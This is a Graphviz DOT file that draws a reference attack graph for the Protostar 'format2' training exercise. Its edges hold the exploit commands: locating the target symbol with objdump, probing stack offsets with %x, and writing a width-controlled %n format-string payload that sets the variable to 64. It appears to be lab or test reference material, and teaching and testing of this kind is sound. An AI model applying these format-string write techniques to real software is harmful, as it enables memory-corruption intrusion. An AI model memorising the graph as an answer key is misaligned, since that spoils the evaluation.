digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Format Two"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="target address recovered"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Stack offset to controlled input identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Width-controlled %n payload built"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="target set to 64"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -t /opt/protostar/bin/format2 | grep \" target$\""];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"AAAA.%x.%x.%x.%x.%x.%x.%x.%x\"' | /opt/protostar/bin/format2"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"\\xe4\\x96\\x04\\x08%60x%4$n\"' > /tmp/format2.in"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format2 < /tmp/format2.in"];
}
